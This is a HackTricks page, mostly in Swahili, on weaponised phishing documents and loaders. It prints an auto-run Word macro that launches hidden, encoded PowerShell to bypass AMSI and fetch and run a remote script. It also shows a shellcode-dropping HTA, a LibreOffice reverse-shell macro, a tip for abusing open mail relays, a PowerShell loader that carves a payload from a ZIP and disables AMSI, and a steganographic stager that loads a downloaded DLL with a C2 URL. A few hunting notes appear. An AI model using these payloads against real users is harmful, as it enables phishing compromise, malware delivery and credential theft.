# Phishing Faili & Nyaraka

{{#include ../../banners/hacktricks-training.md}}

## Office Nyaraka

Microsoft Word hufanya uhakiki wa data za faili kabla ya kufungua faili. Uhakiki wa data unafanywa kwa njia ya utambuzi wa muundo wa data, kulingana na kiwango cha OfficeOpenXML. Ikiwa kosa lolote litatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kawaida, Word files zenye macros hutumia extension ya `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha file extension na bado kuendelea kuwa na uwezo wao wa kutekeleza macros.\
Kwa mfano, faili la RTF halitegemei macros, kwa muundo, lakini faili la DOCM likibadilishwa jina kuwa RTF litashughulikiwa na Microsoft Word na litakuwa na uwezo wa kutekeleza macro.\
Mifumo ya ndani na mbinu sawa zinatumika kwa software zote za Microsoft Office Suite (Excel, PowerPoint etc.).

Unaweza kutumia amri ifuatayo ili kuangalia ni extensions zipi zitatekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Kupakia Picha ya Nje

Go to: _Insert --> Quick Parts --> Field_\
_**Vikundi**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Backdoor ya Macros

Inawezekana kutumia macros kuendesha msimbo wa aina yoyote kutoka kwenye hati.

#### Funsi za Autoload

Kadri zinavyokuwa za kawaida, ndivyo uwezekano wa AV kuzigundua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Mifano ya Msimbo ya Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mikono

Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itaonyesha Document Inspector. Bonyeza **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Ugani la Doc

Ukimaliza, chagua kidirisha cha **Save as type**, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivyo kwa sababu **huwezi kuhifadhi macro's ndani ya `.docx`** na kuna **tabu** **kuhusu** ugani wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/barua pepe huzuia kabisa). Kwa hivyo, **ugani la warithi `.doc` ndilo suluhisho bora**.

#### Jenereta za Macros Hasidi

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT macros zinazoendesha kiotomatiki (Basic)

Nyaraka za LibreOffice Writer zinaweza kujumuisha Basic macros na kuzitekeleza kiotomatiki wakati faili inafunguliwa kwa kuambatanisha macro na tukio la **Open Document** (Tools → Customize → Events → Open Document → Macro…). Macro rahisi ya reverse shell inavyoonekana:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic inazitumia ku-escape nukuu za literal, hivyo payloads ambazo zinaishia na `...==""")` zinahifadhi amri ya ndani na hoja ya Shell zikiwa sawa.

Delivery tips:

- Hifadhi kama `.odt` na uhusishe macro na event ya document ili itekelezwe mara moja inapofunguliwa.
- Unapomtumia `swaks` kwa email, tumia `--attach @resume.odt` (the `@` inahitajika ili file bytes, sio filename string, zitumiwe kama attachment). Hii ni muhimu unapokuwa unayetumia kwa mbaya SMTP servers zinazokubali arbitrary `RCPT TO` recipients bila uthibitisho.

## Faili za HTA

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha Uthibitishaji wa NTLM

Kuna njia kadhaa za **kulazimisha uthibitishaji wa NTLM "mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** katika barua pepe au HTML ambazo mtumiaji atazitumia (hata HTTP MitM?). Au mtumie mwathiriwa **anwani za faili** ambazo zitasababisha **uthibitishaji** kwa kufungua tu folda.

**Angalia mawazo haya na mengine katika kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba hauwezi tu kuiba hash au uthibitishaji, bali pia unaweza kufanya **NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Kampeni zinazofanya kazi vizuri mara nyingi hutuma ZIP inayojumuisha nyaraka mbili halali za kudanganya (PDF/DOCX) na .lnk hatari. Mbinu ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya bytes ghafi za ZIP baada ya alama ya kipekee, na .lnk hutoka (carve) na kuiendesha kabisa kwenye kumbukumbu.

Mtiririko wa kawaida unaotekelezwa na PowerShell one-liner ya .lnk:

1) Tafuta ZIP asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na saraka mzazi ya current working directory.  
2) Soma bytes za ZIP na tafuta alama iliyowekwa (hardcoded) (kwa mfano, xFIQCV). Kila kitu kinachofuata baada ya alama ni embedded PowerShell payload.  
3) Nakili ZIP hadi %ProgramData%, ifungue huko, na ufungue .docx ya kudanganya ili ionekane halali.  
4) Pitia AMSI kwa mchakato wa sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deobfuscate hatua inayofuata (kwa mfano, ondoa tabia zote za #) na uitekeleze katika kumbukumbu.

Mfano wa skeleton wa PowerShell kuvitunga na kuendesha hatua iliyojengewa ndani:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Usambazaji mara nyingi hutumia vibaya subdomain za PaaS zenye sifa (mfano, *.herokuapp.com) na linaweza kuzuia payloads (kutoa ZIPs zisizo hatari kulingana na IP/UA).
- Hatua inayofuata mara nyingi hu-decrypt base64/XOR shellcode na kuitekeleza kupitia Reflection.Emit + VirtualAlloc ili kupunguza athari za diski.

Persistence used in the same chain
- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au programu yoyote inayoi-embed ianzishe payload tena kiotomatiki. Tazama maelezo na amri tayari-kutumiwa hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Utafutaji/IOCs
- ZIP files containing the ASCII marker string (mfano, xFIQCV) iliyoongezwa kwenye data ya archive.
- .lnk inayoorodhesha folda za parent/user kutafuta ZIP na kufungua waraka wa decoy.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads zinazoishia kwa links zilizo hosted chini ya trusted PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains huwasilisha JavaScript/VBS iliyopotoshwa ambayo ina-decode na kuendesha Base64 PowerShell stager. Stager hiyo hupakua picha (mara nyingi GIF) inayobeba Base64-encoded .NET DLL iliyofichwa kama plain text kati ya alama za kipekee za kuanza/kuisha. Script inatafuta delimiters hizi (mifano iliyodhihirika: «<<sudo_png>> … <<sudo_odt>>>»), inachukua maandishi yaliyopo kati yao, ina-decode Base64 hadi bytes, inapakia assembly in-memory na ina-invoke entry method inayojulikana ikitumia C2 URL.

Mtiririko
- Hatua 1: Archived JS/VBS dropper → ina-decode Base64 iliyowekwa ndani → ina-launch PowerShell stager na -nop -w hidden -ep bypass.
- Hatua 2: PowerShell stager → hupakua picha, ina-tenga Base64 iliyotengwa na markers, inapakia .NET DLL in-memory na inaita method yake (mfano, VAI) ikituma C2 URL na chaguzi.
- Hatua 3: Loader huchukua final payload na kwa kawaida huingiza kwa process hollowing ndani ya binary inayotegemewa (kwa kawaida MSBuild.exe). Tazama zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Vidokezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding). Markers zinatofautiana kati ya kampeni.
- AMSI/ETW bypass na string deobfuscation mara nyingi zinatekelezwa kabla ya kupakia assembly.
- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Awamu ya mwanzo inayojitokeza mara kwa mara ni `.js` ndogo au `.vbs` iliyofichwa sana, inayowasilishwa ndani ya archive. Lengo lake pekee ni ku-decode kamba ya Base64 iliyojengwa ndani na kuanzisha PowerShell kwa `-nop -w hidden -ep bypass` ili kuanzisha awamu inayofuata kupitia HTTPS.

Mantiki ya msingi (muhtasari):
- Soma yaliyomo ya faili mwenyewe
- Tafuta blob ya Base64 kati ya mistring ya takataka
- Decode hadi ASCII PowerShell
- Endesha kwa `wscript.exe`/`cscript.exe` ikimuita `powershell.exe`

Vidokezo vya upelelezi
- Viambatisho vya JS/VBS vilivyohifadhiwa ndani ya archive vinavyoanzisha `powershell.exe` kwa `-enc`/`FromBase64String` kwenye mstari wa amri.
- `wscript.exe` ikianzisha `powershell.exe -nop -w hidden` kutoka katika user temp paths.

## Windows files to steal NTLM hashes

Angalia ukurasa kuhusu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
